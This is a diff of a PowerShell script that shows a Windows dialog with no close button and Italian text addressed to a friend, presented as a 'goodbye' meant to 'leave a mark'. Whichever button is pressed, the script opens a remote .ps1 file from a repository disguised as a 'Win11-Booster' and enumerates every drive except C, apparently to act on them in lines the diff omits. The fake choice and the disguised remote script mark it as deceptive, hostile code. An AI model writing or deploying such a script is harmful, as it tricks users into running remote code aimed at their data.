@@ -1,11 +1,11 @@
 Add-Type -AssemblyName System.Windows.Forms
 $form = New-Object System.Windows.Forms.Form
 $form.Text = "Sqttyxsq"
-$form.Size = New-Object System.Drawing.Size(400,300)
+$form.Size = New-Object System.Drawing.Size(800,250)
 $form.StartPosition = "CenterScreen"
 $form.ControlBox = $false
 $label = New-Object System.Windows.Forms.Label
-$label.Text = "Ti ricordi di me ( sai so 2 mesi che nn giochiamo insieme ) siccome questo è un addio volevo lascaire un segno .PS se nn va l'ho fatto apposta "
+$label.Text = "Ti ricordi di me ( sai so 2 mesi che nn giochiamo insieme )"
 $label.AutoSize = $true
 $label.Location = New-Object System.Drawing.Point(10,20)
 $form.Controls.Add($label)
@@ -28,7 +28,7 @@ $form.Controls.Add($noButton)
 $form.ShowDialog()
 
 if ($global:dialogResult -eq "Yes") {
-    start https://raw.githubusercontent.com/Sqttyxsq/Win11-Booster/main/s.ps1
+    start https://raw.githubusercontent.com/Sqttyxsq/Win11-Booster/main/aa.ps1
     $drives = Get-PSDrive -PSProvider FileSystem | Select-Object Name, Used, Free
     $drives | Format-Table -Property Name, Used, Free
     $availableDrives = $drives | Where-Object { $_.Name -match '^[A-Z]$' -and $_.Name -ne 'C' }
@@ -43,7 +43,7 @@ if ($global:dialogResult -eq "Yes") {
         }
     }
 } else {
-    start https://raw.githubusercontent.com/Sqttyxsq/Win11-Booster/main/s.ps1
+    start https://raw.githubusercontent.com/Sqttyxsq/Win11-Booster/main/aa.ps1
     $drives = Get-PSDrive -PSProvider FileSystem | Select-Object Name, Used, Free
     $drives | Format-Table -Property Name, Used, Free
     $availableDrives = $drives | Where-Object { $_.Name -match '^[A-Z]$' -and $_.Name -ne 'C' }
